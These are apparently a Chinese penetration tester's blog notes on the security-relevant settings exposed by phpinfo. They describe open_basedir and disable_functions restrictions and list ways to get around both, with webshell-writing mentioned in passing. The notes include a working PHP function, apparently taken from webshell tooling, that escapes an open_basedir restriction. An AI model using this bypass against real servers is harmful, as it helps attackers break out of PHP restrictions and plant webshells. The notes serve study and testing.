---
title: phpinfo中的信息
date: 2023/5/1 15:00:25
categories:
- 渗透测试
tags:
- PHPinfo
---

# 配置文件

[PHP: php.ini 核心指令说明 - Manual](https://www.php.net/manual/zh/ini.core.php)



ini_set()

https://www.php.net/manual/zh/ini.list.php



# phpinfo

## 总结

[phpinfo中的重要信息](https://www.k0rz3n.com/2019/02/12/PHPINFO%20%E4%B8%AD%E7%9A%84%E9%87%8D%E8%A6%81%E4%BF%A1%E6%81%AF/)

|       变量        |           作用           |
| :---------------: | :----------------------: |
|   open_basedir    | 限制目录访问（可以绕过） |
| disable_function  |   禁用函数（可以绕过）   |
| session.save_path |       配合文件包含       |
|      _SERVER      |       各种主机信息       |
|       pecl        |      confing.php写🐎      |



## open_basedir绕过

```php
在index.php下
ini_set('open_basedir', '/var/www/html/');
所以如果用户通过index.php来访问服务器时，只能访问/var/www/html/
```

[open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

```php
function bypass_open_basedir(){
        if(!file_exists('bypass_open_basedir')){
                mkdir('bypass_open_basedir');
        }
        chdir('bypass_open_basedir');
        @ini_set('open_basedir','..');
        @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']);
        @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
        @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
        $_Ei34Ww_sQDfq_i = 0;
        while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
                @chdir('..');
                $_Ei34Ww_sQDfq_i++;
        }
        @ini_set('open_basedir','/');
        @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
}
```



## disable_function绕过

如何设置`disable_function`

> 在php配置文件php.ini中设置

绕过：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions

​			https://www.freebuf.com/articles/network/263540.html

常见的webshell管理工具都自带相关绕过的模块。



## 配合文件包含Getshell